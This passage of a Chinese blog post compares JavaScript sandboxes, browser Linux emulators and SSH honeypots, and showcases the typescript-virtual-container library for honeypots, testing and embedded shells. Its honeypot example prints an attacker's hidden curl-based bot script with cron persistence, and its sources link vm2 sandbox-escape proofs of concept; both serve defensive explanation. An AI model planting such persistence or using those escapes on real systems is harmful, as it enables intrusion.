"能跑"在能抓凭证抓命令。但老练攻击者一深就穿帮。`uname -a` 回对串，`ls /etc` 回"command not found"，骗谁。文件系统没有。命令串不起来。管道不通。变量不展开。

能干的攻击者五条命令识破你蜜罐。找 Cowrie 味的自动脚本也立刻识破。据说这逼 `typescript-virtual-container` 作者去建真解释命令的东西，下面第 5 部分。

---

### 蜜罐家族总结

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 天真 ssh2 |
|---|---|---|---|---|---|---|
| **交互级别** | 中高 | 中 | 零 | 零 | 可变 | 低 |
| **真 SSH 协议** | ✅ | ✅ | ❌（tarpit） | ✅ | 可变 | ✅ |
| **shell 逼真** | 中 | 中 | 无 | 无 | 可变 | 极小 |
| **抓凭证** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **抓命令** | ✅ | ✅ | ❌ | ✅ | 可变 | ✅ |
| **抓恶意软件** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM 集成** | ✅ 原生 | ❌ | ❌ | ❌ | ❌ | 手工 |
| **LLM 回复** | ✅（新） | ❌ | ❌ | ❌ | ❌ | ❌ |
| **语言** | Python | Python | C | Go | Docker | Node.js |
| **Node.js 原生** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **状态** | ✅ 很活跃 | ⚠️ 归档 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 | 手搓 |

规律清楚：逼真要写 Python。认真干选 Cowrie，生产验证多年，抓的不只凭证。endlessh 和 sshesame 算好玩项目多过正经威胁情报工具。天真 Node.js 版走到 20% 撞墙。
---

## 第 5 部分，`typescript-virtual-container`：补缺口的那个

好，戏肉来了。把上面全家族摆完，缺的象限很明显：

- JS 沙箱：隔离代码，无 shell、无文件系统、无 SSH
- Linux 模拟器：真 OS、真 shell、真 SSH……但 150M+ 内存、30 秒启动，还得自己在串口 I/O 上搭 API
- 蜜罐：假 shell、无可编程 API、Python/Go/C、非 Node 原生

没人做过 Node 原生、完整可编程、真 SSH、真权限、真虚拟网络、TypeScript 类型化 API 的 Linux 完整环境。所以她做了。

先正式介绍一次因为第一次好好提：`typescript-virtual-container` 是[Chloé Rolzhausen](https://itsrealfortune.fr) 做的，法国开发者，网上叫 **Fortune**（或 ItsRealFortune）。她的[网站](https://itsrealfortune.fr)和 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/) 能找到她。整个项目，5.6 万行 TypeScript、247 文件、170 命令，一个人 solo。后面叫她 Fortune。对，挺疯的。去看看她的活！

### 到底是什么

`typescript-virtual-container` 是纯 TypeScript 写的 **Linux 环境仿真器**。无 Wasm、无原生扩展、无内核。源码约 5.6 万行，247 个 TypeScript 文件。

关键洞察：跑 `ls /etc | grep passwd` 用不着 CPU 模拟器。要：
1. 内存里响应路径操作的类型节点树
2. 每次访问按请求 uid/gid 走的 POSIX 权限模型
3. 懂管道、重定向、子 shell、变量展开的 shell 语法解析器
4. 约 170 个命令实现（函数，不是二进制）
5. 用户和组管理系统
6. 经 SSH 暴露一切的东西

纯 TypeScript 全搞定，内核不用出场。

### VirtualFileSystem

VFS 是内存类型节点树，无显式开 `"fs"` 持久模式不碰磁盘 I/O：

```ts
// 简化内部表示
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 懒加载占位
```

每条路径操作过 `normalizePath`（解 `.`、`..`、符号链接）和 `enforceAccess`（按请求 uid/gid 查读/写/执行权限）。`chmod`、`chown`、sticky 位、setuid 全实现真执行。uid 1000 进程读 root 0600 文件，拿 EACCES，不是假 EACCES，是权限检查抛的真 JavaScript `Error`。这块挺优雅说实话。

VFS 序列化：
- `.vfsb`，紧凑自定义二进制格式（fflate 压缩），默认格式
- JSON 快照，人可读，调错好
- TAR 档，真 tar 格式导进导出，所以 `tar -xf` 东西 VFS 里就……有这些文件了
- SquashFS 镜像，只读导入

`"fs"` 持久模式维护预写日志（WAL）做崩溃恢复，写先进日志，flush 进快照。Node 半路挂了，日志重建最后完整态。

还有 `FileCache` 层仿磁盘 I/O 延迟。配 `NVME_DISK_IO`、`HDD_DISK_IO` 这类 profile，VFS 故意拖文件操作到贴真时序。挺逗，软件故意跑慢装硬件，但 benchmark 真有用。

### shell 解释器

shell 解析器产类型化 AST：

```ts
// "ls /etc | grep root && echo done" 解析成：
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

执行器走 AST：
- 管道：建 `{ stdin, stdout, stderr }` 流链，每个命令 I/O 管道接好跑
- 逻辑操作（`&&`、`||`）：查 `$?` 再定跑不跑右边
- 子 shell（`$(...)`、反引号）：分叉执行上下文
- 重定向（`>文件`、`>>文件`、`2>&1`、`<文件`）：跑前接好流线
- 后台任务（`cmd &`）：不等待跑
- 变量：展开 `$VAR`、`${VAR:-default}`、`${#VAR}`、算术 `$((expr))`
- 花括号展开（`{a,b,c}`、`{1..5}`）：跑前展全列表

全是真 POSIX shell 行为。解析器管 heredoc、进程替换、glob（`*`、`?`、`[abc]`）、引号（单引、双引内插值、反斜杠转义）。边角 case 有，但超 TypeScript 项目预期了。

### 约 170 个内置命令

命令是 TypeScript 函数，注册进命令注册表。收 `CommandContext`，带 stdin/stdout/stderr 流、VFS、shell 用户、shell 环境、子模块访问。

写 170 个 Unix 命令实现，多……有的 trivial（`echo`、`true`、`false`），有的惊人复杂（`awk`、`find`、`tar`）。完整 POSIX `awk` TypeScript 写？疯真的。抽样里面有：

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp（客户端，出向连接）,
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git（stub）, python3（stub）, node（stub）,
nano（完整交互编辑器）, vim（基础）, vi（基础）,
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron（仿真）, systemctl（stub）, journalctl（stub）,
...还有约 130 个
```

"stub"（git、python3、node）对常见调用回逼真，`python3 --version` 回可信版本串，`git status` 显示虚构仓库状态，不真干活。蜜罐里这些比真命令有用，看攻击者试跑什么又真不跑危险的。

### SSH 服务器

SSH 层用真 npm `ssh2` 包，真 SSH 协议、真密钥交换、真加密。`SSHMimic` 包一层：

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 真 SSH：ssh -p 2222 root@localhost
// 真 SFTP：sftp -P 2222 root@localhost
// 真 SCP：scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` 定 `uname -a`、`lsb_release -a`、`neofetch`、`/proc/version`、`/etc/os-release` 报什么。装任何 Linux 发行版和内核版本逼真，真 SSH 客户端没法分辨。

### HoneyPot 模块

shell 解释器是真的，SSH 服务器是真的，攻击者命令真在虚拟环境跑。攻击者触发的 `wget` 请求带目标 URL 记日志。攻击者建的文件进 VFS 存着。攻击者提权尝试拿逼真报错。

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// session 后 diff 文件系统
const before = shell.vfs.toSnapshot();
// ... 攻击者 session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

和 Cowrie 质变不同。Cowrie 假文件系统回 `ls`，但攻击者建的文件和改动跟不出结构化 diff。`typescript-virtual-container` 行，因为 VFS 是活数据结构，每写跟踪。攻击者刚加的 cron 在 diff 里。`.hidden` 目录在 diff 里。恶意分析好用。

### 虚拟网络栈

全项目可能最 impress 的部分，别家全无。纯 TypeScript 完整 L2/L3 虚拟网络栈加 VPN 支持，真网卡一块没有。疯真的。

`VirtualNetworkManager` 给每个 `VirtualShell` 实例配虚拟网卡、可配 IP、路由表、软件防火墙（iptables 风格规则，conntrack 加 NAT）。`ip addr`、`ip route`、`iptables -L`、`netstat -rn` 全看虚拟网络态。

`VirtualSwitch`（取名 Baie，法语服务器机柜"baie informatique"）连多 shell 上共享子网。实现：
- MAC 学习和 ARP
- 子网间 IP 路由
- NAT（出向 masquerade）
- DNS（按子网可配记录）
- 负载均衡（轮询、最少连接）
- 流量塑形：延迟、抖动（高斯分布）、丢包、突发丢、重排、复制
- 带宽限（令牌桶）
- MTU 生效
- 连接跟踪（带状态，NEW/ESTABLISHED/TIME_WAIT 态）

```ts
const baie = new Baie("192.168.0.0/24");

// 同交换机三台虚拟机
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// 防火墙：web 到 api 通，api 到 db 通，web 直到 db 不通
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// 流量塑形：模拟到外面不稳 WAN
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` 在 Baie 实例间建加密隧道，仿多站点 VPN 互联网络。

`VirtualProxy` 做端口转发和 SOCKS5 代理。

全不碰真网卡。全 TypeScript 对象路由。`ping` "通"靠经虚拟交换机路由回仿真 ICMP 回复。`curl http://192.168.0.3/api` 经虚拟网络路由，到 shell api 仿真 HTTP 响应，回内容。乌龟叠到底，最好意义那种。

### `SandboxedShell`

编程用要更硬隔离，`SandboxedShell` 在 Node Worker 线程跑 shell session：

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 1 核的 25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

隔离靠 VFS 层（worker 线程 shell 只见虚拟文件系统，永见宿主文件系统）加 Node Worker 线程内存隔离。比 `isolated-vm` 轻，但 shell 级隔离对，JS 级不对。

### 资源上限

按 shell 配资源上限，影响系统监控命令报什么：

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

这 shell 里 `free -m` 看 512M 总内存。`nproc` 回 2。`/proc/meminfo` 看上限值。`htop` 和 `top` 看上限 CPU 数。模拟机硬件指纹精确可定。

### 三种部署模式

```
模式 1：SSH/SFTP 服务器
  VirtualSshServer / VirtualSftpServer
  → 真 SSH 协议，真 SFTP，真 SCP
  → 场景：蜜罐、远程测试环境、培训实验

模式 2：网页 shell（浏览器）
  builds/fortune-nyx-v1.7.8-web.min.js（ESM 包）
  → 浏览器跑，VFS IndexedDB 持久
  → 场景：交互教程、嵌入终端、演示
  → 加分：跑 startxfce4 出完整仿真 XFCE 桌面

模式 3：独立 CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（单文件，免安装）
  → curl 下就跑，VFS 存 .vfs/ 目录
  → 场景：快速演示、本地实验
```

### polyfill，浏览器构建不用 Wasm 的秘密

我觉得最聪明、想单拎讲的部分。

Node.js 库搬浏览器一般噩梦。要么 Wasm 运行时（重、加载慢），要么手替每个 `node:*` 导入写浏览器兼容版。Fortune 干了第二个，但很干净，写了套放仓库 `polyfills/` 的定制 polyfill。

构建流水线就是带一堆 `alias` 项的 esbuild：

```js
// demo/build.js -- 浏览器构建全配置
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

无 Wasm，无外部 polyfill 库，不靠 `webpack-node-externals`。模块别名加几个注入全局。每个单拎因为有的真 impress。

**`node:fs`，IndexedDB 当假文件系统**

我最爱的。`node:fs` polyfill 实现 Node.js 同步 fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`……），底下两层：内存 `Map` 同步读，IndexedDB 页面间持久。写先进 Map（所以 `readFileSync` 紧跟 `writeFileSync` 永远对），后台异步刷 IndexedDB。

```js
// 同步缓存（路径 → Uint8Array | null），读瞬时
const memCache = new Map();

// 启动全量 IndexedDB 预载进 memCache
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

VFS 二进制快照 `.vfsb` 经这 polyfill 写 IndexedDB，下次载页读回，所以浏览器快照刷新不丢。无 Wasm，无服务器。2011 年起浏览器全有 IndexedDB。

**`node:crypto`，纯 JS SHA-256**

不引 Wasm 密码库，crypto polyfill 从零按 FIPS 180-4 轮常量实现 SHA-256。166 行纯 JS，hex/base64/Uint8Array 输出全。库内哈希全走它，SSH 宿主密钥指纹、内部校验和，全。紧凑，零依赖，管用。

**`node:os`，读浏览器真硬件**

体贴的细节。不返回写死假值，读 `navigator.deviceMemory` 拿总内存、`navigator.hardwareConcurrency` 拿 CPU 数。所以浏览器构建 `neofetch` 报的东西对得上你真机，不是 "2 核 2G 内存"糊弄 stub。

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 默认 2G
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // 还解析 navigator.userAgent 猜 CPU 型号串
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`、`ssh2`、`roxify`，诚实 stub**

浏览器开不了 TCP socket、跑不了真 SSH，所以 stub 抛明确 `NotImplemented` 错误，信息清楚。失败显式，不在别处返回 `undefined` 让对象缺。就要"浏览器不行"大声清楚，这才是对的。

**`process.js` 和 `buffer.js`，注入全局**

esbuild `inject` 选项注每文件头，`process` 和 `Buffer` 全局可用无显式导入。`process.js` 极小：`env`、`version`、`platform: 'browser'`、经 `queueMicrotask` 的 `nextTick`、经 `performance.now()` 的 `uptime`。`buffer.js` 是盖 `Uint8Array` 的 `Buffer` 完整重实现，SSH 实现和 VFS 依赖的 `readUInt32BE`、`writeInt16LE`、hex/base64 编码全有。

---

polyfill 全约手写 JS 640 行。无 npm 包，无 Wasm。结果浏览器包就是库本身，原生跑，没有平时"Node 优先库到底浏览器行不行"焦虑。`polyfills/` 目录值得翻，每文件独立可读，风格我很喜欢。

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **类别** | JS 沙箱 | JS 沙箱 | JS 沙箱 | 模拟器 | 模拟器 | Node.js/Wasm | 蜜罐 | 仿真器 |
| **隔离 JS** | ⚠️ 作用域 | ✅ V8 Isolate | ✅ Wasm | 无 | 无 | 部分 | 无 | ✅ Worker |
| **真 Linux 内核** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **shell 解释器** | ❌ | ❌ | ❌ | ✅（真） | ✅（真） | ✅（真） | 部分 | ✅（定制） |
| **约 170 Unix 命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分 | 约 20 | ✅ |
| **POSIX 权限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分 | ✅ 真执行 |
| **用户管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 极小 | ✅ 完整 |
| **真 SSH 服务器** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **蜜罐/审计** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS diff/快照** | ❌ | ❌ | ❌ | 有限 | ❌ | ❌ | ❌ | ✅ |
| **L2/L3 虚拟网络** | ❌ | ❌ | ❌ | 基础 | ❌ | ❌ | ❌ | ✅ 完整 |
| **虚拟 VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **浏览器支持** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js 原生** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **类型化 API** | 基础 | ✅ | ✅ | 极小 | ❌ | ✅ | ❌ | ✅ 完整 |
| **二进制兼容** | 无 | 无 | 无 | ✅ | ✅ | 部分 | 无 | ❌ |
| **启动** | 瞬时 | 瞬时 | 瞬时 | 15-40 秒 | 15-40 秒 | 2-5 秒 | 瞬时 | <1 秒 |
| **内存/实例** | 约 1M | 约 3-10M | 约 5-15M | 150-256M | 200M 起 | 约 100M | 约 50M | 约 5-20M |
| **运行时依赖** | 0 | 1（原生） | 1（Wasm） | 0 | 专有 | 1 | Python 依赖 | 3（ssh2、ws、fflate） |
| **状态** | 稳定 | ✅ 活跃 | ✅ 活跃 | ✅ 很活跃 | 商用 | ✅ 活跃 | ✅ 活跃 | ✅ 活跃 |

---

## 什么时候用什么

**跑不可信 JavaScript，用户提交公式、插件、脚本钩子。**
→ `isolated-vm`。真 V8 Isolate，硬内存上限，显式通信桥。`vm2` 别碰，CVE 单月月更，真的一个月几个。`vm` 别碰，它根本不是沙箱，求你了。

**隔离 JS 但不要原生扩展，或要浏览器兼容。**
→ `quickjs-emscripten`。Wasm 边界，约 500K 模块，浏览器 Node 通吃。V8 慢但真隔离。

**起未经修改真 Linux OS，要二进制兼容。**
→ 32 位 Linux `v86`，或已有 Docker 镜像 `container2wasm`。接受 150M+ 内存 30 秒启动，就这 deal。64 位看 CheerpX 或直接真容器运行时。

**网页应用嵌类 Linux 终端，无后端。**
→ `v86`（完整 OS，重、启动慢）或 `typescript-virtual-container` 浏览器包（仿真器，更轻、瞬时启动，还带 `startxfce4` 完整桌面，挺酷）。

**在线代码教程或浏览器 IDE。**
→ 生态锁 Node.js 用 WebContainers。真 Linux 用户态用 CheerpX。轻量类型化 API 用 `typescript-virtual-container` 浏览器包。

**大规模收 SSH 攻击者 TTP。**
→ Cowrie 生产标准，句号。随便 Linux 服务器跑，接全 SIEM。就用 Cowrie。

**Node.js 应用要 SSH 蜜罐数据可编程 API。**
→ `typescript-virtual-container`。命令真跑。VFS 是活数据结构，随手快照 diff。攻击者拿到可信交互环境，你拿到结构化审计数据，不出 Node。

**CI 自动化 shell/测试，不用 Docker。**
→ `typescript-virtual-container`。不到一秒起，测前快照，测后恢复。类型化 API 跑 shell 命令。无 Docker 守护、无内核、无 VM、无等待。

**多租户 shell 环境（SaaS、教育、培训）。**
→ `typescript-virtual-container`。每实例 5-20M 对模拟器 150-256M。100 并发用户：约 2G 对约 25G。托管成本差大！

**逼真蜜罐还要顺手搭多 VM 网络实验。**
→ `typescript-virtual-container` 是这块唯一两者兼得的。

---

## 干不了什么（说实话）

原生 x86 二进制跑不了。要编译 C 代码、跑真 Python 解释器、用 Linux 编译软件，内核 ABI 撑系统调用没有。`gcc`、`python3`、`node` 这类命令是 stub，回 `--version` 和常见调用，真活不干。

根本 trade-off：内存少 10 到 50 倍、瞬时启动、浏览器兼容、类型化 API、真 SSH、虚拟网络，换掉 Linux 用户态二进制兼容。

Fortune 设计时想很多。她瞄的场景，蜜罐、测试、嵌入终端、CI 环境，编译二进制其实永远用不上。shell 管线、文件操作、网络路由、SSH 全覆盖。但场景要真编译软件，`v86` 或 Docker 才是答案，不是它。

---

## 收尾

行。这生态比看着散碎。`vm` 是作用域分隔器，不是沙箱。`vm2` CVE 一直涨（真的，看这月公告）。`isolated-vm` 是 JS 隔离正解但只管 JS。`quickjs-emscripten` 浏览器兼容或避原生扩展时对。`v86` 和 CheerpX 是真要二进制兼容的真模拟器。WebContainers 是 Wasm Node.js，不是通用 Linux 环境。Cowrie 是 SSH 蜜罐标杆，但是 Python 非 Node 原生。

然后 `typescript-virtual-container`，Fortune 的项目，活在自己类别。不模拟器，不 JS 沙箱，不被动蜜罐。中间都沾点，好多事别的全干不了出奇好用。

`typescript-virtual-container` 补的缺口别家不碰：完整可编程 Linux shell 环境，真 SSH、SFTP、POSIX 权限、用户管理、虚拟网络、TypeScript 类型化 API，跑在约 10M，1 秒内启动，Node.js 浏览器通吃。

想试：源码在 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，在线演示有（`startxfce4` 完整桌面，疯真的）在 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)。去看看给 Fortune GitHub 点星，她值得！

读到这，辛苦，这篇按我标准也长 :) 希望有用！

---

## 来源

每个断言尽量链一手来源，CVE 公告、官方文档、GitHub 仓库、维护者博客。几点：vm2 CVE 单一直涨 FortiGuard 链接你读时可能旧了（看 GitHub 公告页最新）。Bellard 链接全稳，他个人站一直在内容不变。深挖 polyfill 直接翻 `typescript-virtual-container` 仓库 `polyfills/` 目录，比我任何描述好读。

### JavaScript 沙箱

- **Node.js `vm` 模块**，官方文档：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` 安全警告**，"vm 模块不是安全机制。不要拿它跑不可信代码"：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**，npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE 年表**，FortiGuard 全列表加日期预警：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**，异步错误逃逸，GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**，Proxy 加 Error.name 加 Function escape，gist PoC：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**，Exploit DB 入口加完整 PoC：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026 vm2 CVE**，11 个新逃逸，分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**，oxeye.io CVE-2022-36067 事后：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**，npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate 内部**，嵌入指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**，npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**，npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS 引擎**，Fabrice Bellard：[bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno 权限模型**，文档：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 发布**，2024 年 10 月：[deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm 提案**：[github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments 提案**：[github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**，Andrew Healey Deno 沙箱实战：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux 模拟器

- **`v86`**，npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · 演示：[copy.sh/v86](https://copy.sh/v86)
- **v86 OS 支持矩阵**：[github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS**（v86 用 BIOS）：[seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE 扩展**（VGA 参考）：[bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**，Bellard 模拟器：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技术笔记（TinyEMU、历史、asm.js→Wasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**，C 源码：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非官方 GitHub 镜像：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**，JS OpenRISC 模拟器：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 演示：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**，文档：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthread 指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**，npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 文档：[webcontainers.io](https://webcontainers.io) · 公告：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 前瞻：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**，GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 博客：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 文章：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### 终端栈

- **xterm.js**，npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 站：[xtermjs.org](https://xtermjs.org)
- **node-pty**，npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（微软）：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### 蜜罐

- **Cowrie**，GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文档：[docs.cowrie.org](https://docs.cowrie.org) · 站：[cowrie.org](https://www.cowrie.org/)
- **Kippo**，GitHub（归档）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**，GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**，GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**，Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**，最小 Node.js SSH 蜜罐：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**，整理列表：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
